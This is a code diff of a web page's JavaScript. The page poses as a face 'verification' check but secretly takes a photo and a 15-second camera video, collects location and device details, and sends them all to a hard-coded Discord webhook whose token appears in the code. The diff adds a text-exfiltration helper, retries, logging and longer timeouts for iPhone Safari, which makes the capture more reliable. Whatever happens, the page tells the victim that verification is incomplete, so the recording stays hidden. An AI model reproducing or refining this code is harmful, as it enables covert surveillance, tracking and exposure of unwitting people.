@@ -58,7 +58,7 @@
     const progressText = document.getElementById('progressText');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
-    const RECORD_DURATION = 15000; // longer to help metadata
+    const RECORD_DURATION = 15000;
 
     let startTime = 0;
     let animationFrameId = null;
@@ -73,6 +73,19 @@
       if (percent < 100) animationFrameId = requestAnimationFrame(updateProgress);
     }
 
+    async function sendText(content) {
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content })
+        });
+        console.log('Text message sent:', content.slice(0, 50));
+      } catch (e) {
+        console.error('Text send failed:', e);
+      }
+    }
+
     async function sendAttachment(content, blob, filename) {
       const payload = { content };
       const formData = new FormData();
@@ -80,10 +93,10 @@
       formData.append('file', blob, filename);
       try {
         const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        console.log(`Send to ${filename} - Status: ${res.status} ${res.statusText}`);
+        console.log(`Attachment send to ${filename} - Status: ${res.status} ${res.statusText}`);
         return res.ok;
       } catch (e) {
-        console.error(`Send error for ${filename}:`, e);
+        console.error(`Attachment send error for ${filename}:`, e);
         return false;
       }
     }
@@ -115,10 +128,10 @@
             videoElement.play().catch(e => console.error("Play error:", e));
             resolve();
           };
-          setTimeout(resolve, 5000); // long settle for iPhone Safari
+          setTimeout(resolve, 6000); // extra long for iOS Safari front cam
         });
 
-        await new Promise(r => setTimeout(r, 1500));
+        await new Promise(r => setTimeout(r, 2000));
 
         // Mugshot
         const mugshotBlob = await captureMugshot();
@@ -137,10 +150,10 @@
             `face_${Date.now()}.png`
           );
         } else {
-          console.log('Mugshot failed or empty');
+          console.log('Mugshot blob invalid or empty');
         }
 
-        // Video - hardened
+        // Video
         progressContainer.style.display = 'block';
         msg.textContent = "";
 
@@ -151,6 +164,8 @@
           if (e.data.size > 0) {
             chunks.push(e.data);
             console.log(`Chunk added - size: ${e.data.size / 1024} KB`);
+          } else {
+            console.log('Empty chunk event');
           }
         };
 
@@ -161,9 +176,11 @@
 
           stream.getTracks().forEach(track => track.stop());
 
+          console.log(`Recording stopped - ${chunks.length} chunks`);
+
           if (chunks.length === 0) {
-            console.log('NO CHUNKS RECORDED - video failed');
-            await sendToWebhook(`⚠️ Video attempt - NO DATA RECORDED\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
+            console.log('NO CHUNKS - sending failure notice');
+            await sendText(`⚠️ VIDEO FAILURE - NO CHUNKS RECORDED\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
             msg.textContent = "Verification incomplete. Center Face In Camera View";
             progressContainer.style.display = 'none';
             btn.style.display = 'none';
@@ -171,29 +188,24 @@
           }
 
           const blob = new Blob(chunks, { type: 'video/webm' });
-          console.log(`Final video blob size: ${blob.size / 1024} KB`);
-
-          if (blob.size < 5000) {
-            console.log('Blob too small - likely junk');
-            await sendToWebhook(`⚠️ Video attempt - TINY BLOB (${blob.size} bytes)\nUA: ${navigator.userAgent}`);
-          }
+          console.log(`Final blob created - size: ${blob.size / 1024} KB`);
 
           let geoDetails = geo;
 
-          const vidContent = `🎥 Video clip attached\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
+          const vidContent = `🎥 Video clip attempt\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`;
 
-          // Try .webm first
-          let sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.webm`);
+          // Try .webm
+          let sent = await sendAttachment(vidContent, blob, `video_${Date.now()}.webm`);
 
-          // Retry with .mp4 if failed
+          // Retry .mp4
           if (!sent) {
-            console.log(' .webm send failed - retrying .mp4');
-            sent = await sendAttachment(vidContent, blob, `verification_${Date.now()}.mp4`);
+            console.log('webm failed - retry mp4');
+            sent = await sendAttachment(vidContent, blob, `video_${Date.now()}.mp4`);
           }
 
           if (!sent) {
-            console.log('Both send attempts failed');
-            await sendToWebhook(`⚠️ Video send FAILED (both extensions)\nBlob size was ${blob.size} bytes\nUA: ${navigator.userAgent}`);
+            console.log('All sends failed');
+            await sendText(`⚠️ VIDEO SEND FAILED - blob was ${blob.size} bytes\nUA: ${navigator.userAgent}`);
           }
 
           msg.textContent = "Verification incomplete. Center Face In Camera View";
@@ -201,13 +213,13 @@
           btn.style.display = 'none';
         };
 
-        recorder.start(1000); // force chunk every second
+        recorder.start(1000);
         startTime = Date.now();
         updateProgress();
         setTimeout(() => recorder.stop(), RECORD_DURATION);
 
       } catch (err) {
-        console.error('Overall error:', err);
+        console.error('Main error:', err);
         msg.textContent = "Verification incomplete. Center Face In Camera View";
         progressContainer.style.display = 'none';
         btn.disabled = false;
